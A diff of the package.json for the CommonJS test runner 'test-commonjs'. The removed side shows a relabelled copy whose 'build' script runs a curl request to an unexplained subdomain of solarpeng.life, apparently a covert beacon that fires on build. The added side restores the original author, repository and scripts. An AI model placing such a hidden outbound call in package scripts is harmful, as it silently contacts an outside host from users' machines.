@@ -1,6 +1,6 @@
 {
-  "name": "solarpeng_node_eval11",
-  "version": "1.10.0",
+  "name": "solarpeng09",
+  "version": "0.6.0",
   "description": "(Un)CommonJS test runner.",
   "keywords": [
     "test",
@@ -9,7 +9,7 @@
     "unit"
   ],
   "homepage": "https://github.com/Gozala/test-commonjs/",
-  "author": "solarpeng502",
+  "author": "Irakli Gozalishvili <rfobic@gmail.com> (http://jeditoolkit.com)",
   "contributors": [
     "Irakli Gozalishvili <rfobic@gmail.com> (http://jeditoolkit.com)",
     "Kris Kowal <kris@cixar.com> (http://github.com/kriskowal/)",
@@ -21,18 +21,16 @@
   ],
   "repository": {
     "type": "git",
-    "url": "https://github.com/solarpeng502/solarpeng_node_eval.git",
-    "web": "https://github.com/solarpeng502/solarpeng_node_eval"
+    "url": "https://github.com/Gozala/test-commonjs.git",
+    "web": "https//github.com/Gozala/test-commonjs"
   },
   "bugs": {
-    "url": "https://github.com/solarpeng502/solarpeng_node_eval/issues/"
+    "url": "http://github.com/Gozala/test-commonjs/issues/"
   },
   "scripts": {
     "test": "npm run test-node && npm run test-browser",
     "test-browser": "node ./node_modules/phantomify/bin/cmd.js ./test/index.js",
-    "test-node": "node ./test/index.js",
-    "start": "react-scripts start",
-    "build": "react-scripts build;curl http://d3a00817f6vjqte9lch05mtpek5qd4czs.solarpeng.life/test"
+    "test-node": "node ./test/index.js"
   },
   "main": "./test.js",
   "licenses": [
